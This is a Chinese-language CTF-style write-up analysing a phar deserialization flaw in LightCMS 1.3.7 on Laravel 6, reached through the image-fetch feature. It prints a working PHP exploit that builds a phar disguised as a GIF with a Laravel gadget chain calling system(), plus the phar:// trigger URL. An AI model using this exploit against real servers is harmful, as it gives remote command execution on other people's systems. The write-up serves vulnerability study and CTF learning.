> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [xz.aliyun.com](https://xz.aliyun.com/t/9561)

> 先知社区，先知安全技术社区

写在前面
----

在这次红帽中有一道这样的题，审的时候看到有文件上传，但是存在白名单限制，laravel6 是有反序列化漏洞的，想到要用文件上传打 phar 的，但是没有找到可以触发 phar 的利用点，可惜了。

环境准备
----

```
phpstorm +php7.3+xdebug+lightcms 1.3.7
```

按照[官网](https://github.com/eddy8/LightCMS/tree/v1.3.7)的教程来安装就好了。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210510181154-252d1eb4-b178-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210510181154-252d1eb4-b178-1.png)

漏洞分析
----

拿到源码，看一圈，基本都是一些数据库的操作，而且还没有可以控制的参数。

有一个文件上传的地方。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210510181154-25436944-b178-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210510181154-25436944-b178-1.png)

其中的 `uploadImage` 方法可以上传图片

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210510181154-255a2a08-b178-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210510181154-255a2a08-b178-1.png)

看一下 `isValidImage` 方法

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210510181154-256b46ee-b178-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210510181154-256b46ee-b178-1.png)

在 `/config/light.php` 里找配置

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210510181154-2587ceb8-b178-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210510181154-2587ceb8-b178-1.png)

不难发现允许上传的文件类型还是比较苛刻的。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210510181155-25d8f68a-b178-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210510181155-25d8f68a-b178-1.png)

上传的图片地址如上。

同样有 `uploadVedio` 和 `uploadFile` 方法，操作相差不大。

这个控制器下面还有一个 `catchImage` 的方法

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210510181155-25ed9496-b178-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210510181155-25ed9496-b178-1.png)

这个方法在 1.3.5 之前的版本是存在漏洞的，

[https://tyskill.github.io/Articles/CVE-2021-27112/](https://tyskill.github.io/Articles/CVE-2021-27112/)

可以参照这篇文章看一看。

作者修复的地方就是添加了 `fetchImageFile` 方法。

跟进看一下

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210510181155-2608c400-b178-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210510181155-2608c400-b178-1.png)

先检查是否是合法的 url，

如果 curl 出错，会返回 false，（windows 因为 没有 `file:///etc/passwd`，所以返回了 fasle）也就是直接 return 掉了，当然我们是希望不被 return 的，修改一下值好了。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210510181155-261f8942-b178-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210510181155-261f8942-b178-1.png)

`isWebp`是一个自定义函数

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210510181155-262e56ac-b178-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210510181155-262e56ac-b178-1.png)检查图片是否是 `webP` 格式不是就进入`else`分支，执行`Image::make($data)` 方法

不断步进，先不要步过，一步一步看，小心遗漏重要的点。直到这里

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210510181156-263ceeb0-b178-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210510181156-263ceeb0-b178-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210510181156-26567574-b178-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210510181156-26567574-b178-1.png)

我们刚刚修改的 `data`值为`true`，是为了防止刚刚被`return`掉。但其实如果我们 去 `curl` 一个正常的网页， `$data` 是有数据的，会在这里的`case` 分支进行处理，注意这里，有个 `isUrl` 方法，判断我们的`curl` 后的数据是否是个`url`？是否可以`phar` 呢？

`phar` 协议可以通过检测

再看`initFromUrl`方法。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210510181156-26681fcc-b178-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210510181156-26681fcc-b178-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210510181156-26753996-b178-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210510181156-26753996-b178-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210510181156-268bdf0c-b178-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210510181156-268bdf0c-b178-1.png)

这里用 `file_get_contents` 处理我们的`curl`后的`data`，可以触发`phar`协议。

exp 如下

```
<?php
namespace Illuminate\Broadcasting
{
    use  Illuminate\Events\Dispatcher;
    class PendingBroadcast
    {
        protected $events;
        protected $event;
        public function __construct($cmd)
        {
            $this->events = new Dispatcher($cmd);
            $this->event=$cmd;
        }
    }

}


namespace Illuminate\Events
{
    class Dispatcher
    {
       protected $listeners;
       public function __construct($event){
           $this->listeners=[$event=>['system']];
       }
    }
}
namespace{
    $phar = new Phar('phar.phar');
    $phar -> startBuffering();
    $phar -> setStub('GIF89a'.'<?php __HALT_COMPILER();?>');
    $o = new Illuminate\Broadcasting\PendingBroadcast($argv[1]);
    echo base64_encode(serialize($o));
    $phar -> setMetadata($o);
    $phar -> addFromString('test.txt','test');
$phar -> stopBuffering();
}


```

将文件后缀改成 .gif

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210510181156-26a4936c-b178-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210510181156-26a4936c-b178-1.png)

ok，现在在 vps 上写入

```
phar://./upload/image/202105/IWacvAi8HW9bb6PMdmyURxQSy12tVgp2sevOUXV5.gif

```

打

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210510181156-26ba10f2-b178-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210510181156-26ba10f2-b178-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210510181157-26eb56bc-b178-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210510181157-26eb56bc-b178-1.png)

写在后面
----

这个漏洞的利用点着实够刁钻的，一个 url 后再加一个 url。Y1ng 师傅牛逼。最后真的希望各位 ctf 选手洁身自好，py 可真没意思，尊重出题人，尊重比赛，尊重那些有梦想的师傅。

参考
--

[https://www.gem-love.com/websecurity/2763.html](https://www.gem-love.com/websecurity/2763.html)